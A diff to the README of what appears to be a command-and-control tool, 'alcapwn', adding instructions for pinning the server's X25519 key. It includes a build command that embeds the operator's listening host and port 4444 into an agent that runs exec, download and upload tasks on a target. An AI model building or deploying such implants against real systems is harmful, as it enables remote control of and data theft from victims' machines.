@@ -50,6 +50,32 @@ The agent auto-reconnects, identifies itself by hardware fingerprint, and accept
 `exec`, `download`, and `upload` tasks. Set `ALCAPWN_DEBUG=1` on the target to
 enable agent-side stderr logging.
 
+### Agent Key Fingerprint (Certificate Pinning)
+
+On first run alcapwn generates a long-term X25519 keypair and stores it in
+`~/.alcapwn/server_key.bin`. The SHA-256 fingerprint of the server public key is
+printed at startup alongside the TLS fingerprint:
+
+```
+[*] Server key fingerprint: a3f1c2...  (X25519)
+```
+
+Embed this fingerprint in the agent at build time to prevent MITM:
+
+```bash
+CGO_ENABLED=0 go build -o agent_bin \
+  -ldflags "-X main.lhost=<your-ip> -X main.lport=4444 \
+            -X main.serverFingerprint=a3f1c2..." \
+  ./agent/
+```
+
+An agent built with a fingerprint will refuse to connect to any server whose key does
+not match and close the connection immediately. Leaving `serverFingerprint` empty skips
+verification — acceptable for local development and testing, not for operational use.
+
+To rotate the server key, delete `~/.alcapwn/server_key.bin` and restart; all deployed
+agents pinned to the old key will need to be rebuilt.
+
 ## Reverse Shell Payloads
 
 ```bash
